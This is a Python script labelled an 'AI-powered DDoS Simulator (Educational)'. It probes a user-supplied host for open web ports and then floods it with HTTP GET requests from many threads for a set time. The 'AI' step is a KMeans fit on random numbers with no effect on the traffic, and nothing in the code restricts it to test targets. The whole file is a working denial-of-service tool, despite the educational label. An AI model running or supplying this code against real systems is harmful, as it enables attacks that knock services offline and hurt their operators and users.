import numpy as np
import requests
from sklearn.cluster import KMeans
import threading
import time

class AIDDoSSimulator:
    @staticmethod
    def find_open_port(host, ports=[80, 443, 8080, 8000, 5000]):
        import socket
        for port in ports:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(0.5)
                try:
                    if sock.connect_ex((host, port)) == 0:
                        return port
                except Exception:
                    continue
        return None
    def __init__(self, target_url, num_threads=100, duration=30):
        self.target_url = target_url
        self.num_threads = num_threads
        self.duration = duration
        self.stop_event = threading.Event()

    def ai_pattern(self):
        # Simulate AI-based traffic pattern using clustering
        traffic = np.random.rand(self.num_threads, 2)
        kmeans = KMeans(n_clusters=3)
        labels = kmeans.fit_predict(traffic)
        return labels

    def attack_thread(self, label):
        end_time = time.time() + self.duration
        packet_count = 0
        while time.time() < end_time and not self.stop_event.is_set():
            try:
                response = requests.get(self.target_url)
                packet_count += 1
                print(f"[Thread {threading.get_ident()} | Cluster {label}] Packet #{packet_count} -> {self.target_url} | Status: {response.status_code}")
            except Exception as e:
                packet_count += 1
                print(f"[Thread {threading.get_ident()} | Cluster {label}] Packet #{packet_count} -> {self.target_url} | Error: {e}")
            time.sleep(np.random.uniform(0.01, 0.1))

    def start_attack(self):
        print(f"Starting AI-powered DDoS simulation on {self.target_url} with {self.num_threads} threads for {self.duration} seconds.")
        labels = self.ai_pattern()
        threads = []
        for i in range(self.num_threads):
            t = threading.Thread(target=self.attack_thread, args=(labels[i],))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()
        print("Simulation complete.")

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="AI-powered DDoS Simulator (Educational)")
    parser.add_argument("--url", required=True, help="Target URL for simulation (e.g., http://example.com)")
    parser.add_argument("--threads", type=int, default=100, help="Number of threads")
    parser.add_argument("--duration", type=int, default=30, help="Duration in seconds")
    args = parser.parse_args()

    # Extract host from URL
    from urllib.parse import urlparse
    parsed = urlparse(args.url)
    host = parsed.hostname
    open_port = AIDDoSSimulator.find_open_port(host)
    if open_port:
        print(f"Open port found: {open_port}")
        # Rebuild URL with detected port if not default
        if (parsed.scheme == "http" and open_port != 80) or (parsed.scheme == "https" and open_port != 443):
            target_url = f"{parsed.scheme}://{host}:{open_port}"
        else:
            target_url = f"{parsed.scheme}://{host}"
    else:
        print("No open web port found on target. Exiting.")
        exit(1)

    simulator = AIDDoSSimulator(target_url, args.threads, args.duration)
    simulator.start_attack()
